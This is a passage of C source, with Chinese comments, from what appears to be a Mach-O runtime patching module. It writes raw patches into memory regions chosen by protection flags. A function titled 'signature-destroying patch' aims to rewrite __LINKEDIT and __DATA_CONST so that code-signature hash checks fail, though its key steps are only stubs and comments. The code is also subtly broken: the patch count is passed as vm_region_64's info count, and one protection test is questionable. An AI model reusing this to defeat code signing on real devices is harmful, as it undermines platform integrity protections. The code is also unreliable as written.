                  patch_descriptor_t *patches, int count)
{
    seg_info_t segs;
    if (parse_load_commands(header, &segs) != 0) {
        LOGE("vm_patch: failed to parse load commands");
        return -1;
    }
    for (int i = 0; i < count; i++) {
        patch_descriptor_t *pd = &patches[i];
        uint32_t prot = pd->protection;
        /* 修复: 运算符优先级 - () 包裹整个表达式 */
        /* 分支A: ((prot^0xffffff00)&prot)==7 -> RWX 补丁 */
        if (((prot ^ 0xffffff00) & prot) == 7) {
            if (pd->target_addr && pd->patch_data[0]) {
                apply_patch((void *)pd->target_addr, 64, pd->patch_data);
            }
        }
        /* 分支B: (prot&0xff)==6 -> __DATA_CONST 补丁 */
        else if ((prot & 0xff) == 6) {
            /* __DATA_CONST 段: 需要 vm_region_64 查询内存区域 */
            vm_address_t addr = pd->target_addr;
            vm_size_t size;
            vm_region_64_info_t info;
            mach_port_t object_name;
            int local_count = count;
            kern_return_t kr = vm_region_64(mach_task_self(), &addr, &size,
                                            VM_REGION_64_BASIC_INFO,
                                            (vm_region_64_info_t)&info,
                                            (mach_msg_type_number_t*)&local_count, &object_name);
            if (kr == KERN_SUCCESS && object_name != MACH_PORT_NULL) {
                mach_port_deallocate(mach_task_self(), object_name);
            }
            /* 继续应用补丁 */
            if (pd->target_addr && pd->patch_data[0]) {
                apply_patch((void *)pd->target_addr, 64, pd->patch_data);
            }
        }
    }
    return 0;
}

/* ========== 签名破坏补丁 ==========
 * 改写 __LINKEDIT (code signature) 和 __DATA_CONST (常量段)
 * 使代码签名哈希校验失效
 */
int patch_code_signature(struct mach_header_64 *header)
{
    seg_info_t segs;
    if (parse_load_commands(header, &segs) != 0) return -1;
    /* 定位 __LINKEDIT 段并破坏签名 */
    if (segs.seg_linkedit) {
        LOGI("vm_patch: __LINKEDIT found, would patch signature");
        /* 实际实现: 找到签名数据段并写入无效签名 */
    }
    /* 定位 __DATA_CONST 段并改写常量 */
    if (segs.seg_data_const) {
        LOGI("vm_patch: __DATA_CONST found at 0x%llx, size=0x%llx",
             segs.seg_data_const->vmaddr, segs.seg_data_const->vmsize);
        /* 实际实现: vm_protect -> memcpy -> sys_icache_invalidate */
    }
    return 0;
}

/* ========== 初始化 ========== */
void vm_patch_init(void)
{
    LOGI("vm_patch: subsystem initialized");
}
